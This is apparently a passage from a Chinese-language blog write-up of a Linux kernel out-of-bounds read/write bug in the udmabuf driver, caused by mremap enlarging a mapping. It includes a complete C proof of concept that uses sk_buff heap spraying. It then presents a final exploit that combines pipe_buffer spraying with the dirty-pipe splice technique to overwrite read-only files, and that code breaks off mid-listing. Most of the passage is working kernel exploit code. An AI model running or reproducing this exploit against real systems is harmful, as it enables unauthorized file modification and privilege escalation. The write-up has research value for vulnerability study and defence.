<code>udmabuf</code> 的 <code>mmap()</code> 路径上 <strong>并未为 vm_area_struct 添加任何限制，这意味着可以直接用 mremap 改变内存块的大小</strong> ——这意味着 mmap 区域的缺页异常 <strong>可以超出 udmabuf::pages 的范围，将其相邻内存上的数据看作一个 page 指针进行映射</strong> ——即存在越界读写漏洞</p><p> <img src="https://s2.loli.net/2024/12/31/c3UShpumLf1qP5J.png"></p><h2 id="Proof-Of-Concept"><a href="#Proof-Of-Concept" class="headerlink" title="Proof-Of-Concept"></a>Proof-Of-Concept</h2><p>现在我们来进行漏洞验证，我们首先在 <code>udmabuf::pages</code> 旁边堆喷一大堆的垃圾数据，之后再使用 <code>mremap()</code> 扩展 <code>mmap()</code> 区域，随后读写 <code>mmap()</code> 区域以触发缺页异常来触发内核越界读写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/udmabuf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UDMA_PAGE_NR 128</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">init_socket_array</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-comment">/* socket pairs to spray sk_buff */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_socket[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create no.%d socket pair!\n&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spray_sk_buff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">proof_of_concept</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd, mem_fd;<br>    <span class="hljs-type">char</span> *udma_buf, buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf_create</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>];<br><br>    <span class="hljs-comment">/* prepare stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Preparing...&quot;</span>);<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (init_socket_array(sk_socket) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Unable to create socket for heap spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    mem_fd = memfd_create(<span class="hljs-string">&quot;test&quot;</span>, MFD_ALLOW_SEALING);<br>    <span class="hljs-keyword">if</span> (mem_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ftruncate(mem_fd, <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to change size of mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to seal mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/udmabuf&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open udmabuf dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* first heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying sk_buff...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (spray_sk_buff(sk_socket, buf, UDMA_PAGE_NR * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) - <span class="hljs-number">512</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to do the heap spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* allocate udmabuf::pages */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating udmabuf...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    info.memfd = mem_fd;<br>    info.size = <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR;<br><br>    dma_fd = ioctl(dev_fd, UDMABUF_CREATE, &amp;info);<br>    <span class="hljs-keyword">if</span> (dma_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create dma_buf&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* second heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying sk_buff...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (spray_sk_buff(sk_socket, buf, UDMA_PAGE_NR * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) - <span class="hljs-number">512</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to do the heap spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* mmap stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] MMAP and MREMAP udmabuf...&quot;</span>);<br><br>    udma_buf = mmap(<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        PROT_READ | PROT_WRITE,<br>        MAP_FILE | MAP_SHARED,<br>        dma_fd,<br>        <span class="hljs-number">0</span><br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    udma_buf = mremap(<br>        udma_buf,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        <span class="hljs-number">0x1000</span> * (UDMA_PAGE_NR + <span class="hljs-number">1</span>),<br>        MREMAP_MAYMOVE<br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to mremap dma_buf area&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* trigger out-of-bound vulnerabilities */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering...&quot;</span>);<br>    *(<span class="hljs-type">size_t</span>*) &amp;udma_buf[<span class="hljs-number">0x1000</span> * UDMA_PAGE_NR] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    proof_of_concept();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <span class="hljs-comment">/* never arrive here... */</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功让内核尝试将我们的垃圾数据作为 <code>struct page*</code> 指针进行映射：</p><p><img src="https://s2.loli.net/2025/01/01/2zapKWJb8lByN3G.png"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02. 漏洞利用"></a>0x02. 漏洞利用</h1><h2 id="越界映射-pipe-buffer-page-完成文件越权读写"><a href="#越界映射-pipe-buffer-page-完成文件越权读写" class="headerlink" title="越界映射 pipe_buffer::page 完成文件越权读写"></a>越界映射 <code>pipe_buffer::page</code> 完成文件越权读写</h2><p>有了将越界数据作为 <code>struct page</code> 指针进行使用的权能，接下来我们考虑如何进行漏洞利用，我们不难想到的是可以将开头原生有着合法 <code>struct page</code> 指针的结构体作为 <code>victim object</code> ，而其中不难想到的是 <code>struct pipe_buffer</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>而想到 <code>pipe_buffer</code> ，我们不难想到 <a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">CVE-2022-0847</a> ，即 <code>dirty pipe</code> 这一利用手法——<strong>通过 spice 系统调用将 pipe_buffer::page 映射为只读文件内容，从而完成越权写入操作</strong> ：</p><ul><li>首先堆喷 <code>pipe_buffer</code></li><li>接下来分配 <code>udmabuf::pages</code></li><li>再堆喷 <code>pipe_buffer</code> ，从而确保能够将  <code>udmabuf::pages</code> 用 <code>pipe_buffer</code> 包围</li><li>通过 splice 系统调用映射只读文件到  <code>pipe_buffer::page</code> </li><li>通过漏洞映射  <code>pipe_buffer::page</code> 页面并改写内容</li></ul><p>最终的 exp 如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/udmabuf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UDMA_PAGE_NR 128</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">prepare_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((err = pipe(pipe_fd[i])) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> err;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], <span class="hljs-type">int</span> victim_fd)</span><br>&#123;<br>    <span class="hljs-type">ssize_t</span> err;<br>    <span class="hljs-type">loff_t</span> offset;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        offset = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> ((err = splice(victim_fd, &amp;offset, pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to splice %d pipe!&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> err;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">proof_of_concept</span><span class="hljs-params">(<span class="hljs-type">char</span> *target_file, <span class="hljs-type">char</span> *content)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd, mem_fd, victim_fd;<br>    <span class="hljs-type">char</span> *udma_buf, buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf_create</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-type">int</span> pipe_fd1[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], pipe_fd2[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br><br>    <span class="hljs-comment">/* prepare stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Preparing...&quot;</span>);<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    mem_fd = memfd_create(<span class="hljs-string">&quot;test&quot;</span>, MFD_ALLOW_SEALING);<br>    <span class="hljs-keyword">if</span> (mem_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ftruncate(mem_fd, <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to change size of mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to seal mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/udmabuf&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open udmabuf dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    victim_fd = open(target_file, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (victim_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open target victim file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* first heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying pipe_buffer...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (prepare_pipe(pipe_fd1) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to spray pipe_buffer&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* allocate udmabuf::pages */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating udmabuf...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    info.memfd = mem_fd;<br>    info.size = <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR;<br><br>    dma_fd = 